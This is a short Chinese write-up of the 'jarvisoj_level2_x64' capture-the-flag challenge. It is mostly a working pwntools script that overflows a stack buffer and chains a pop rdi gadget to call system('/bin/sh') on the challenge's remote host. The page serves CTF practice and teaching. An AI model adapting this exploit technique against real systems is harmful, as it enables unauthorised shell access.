---
title: "Jarvisoj_level2_x64"
description: ""
date: 2023-04-07T00:17:54+08:00
lastmod: 2023-04-07T00:17:54+08:00
draft: false
images: []
type: docs
weight: 990
toc: true
---

## 0x01 分析

jarvisoj\_level2的64位版本，有system和 `/bin/sh` 字符串，只是传参方式变了，还是ret2libc类型

## 0x02 Exploit

```python
from pwn import*
# o = process("./pwn")
o = remote("node4.buuoj.cn", 27906)
pop_rdi = 0x00000000004006b3
payload = b'a'*0x88 + p64(pop_rdi) + p64(0x600A90) + p64(0x400603)
o.sendline(payload)
o.interactive()
```

![4467f6e1a55a54a15378ed623d1fe218](images/4467f6e1a55a54a15378ed623d1fe218.png)  

自行调试
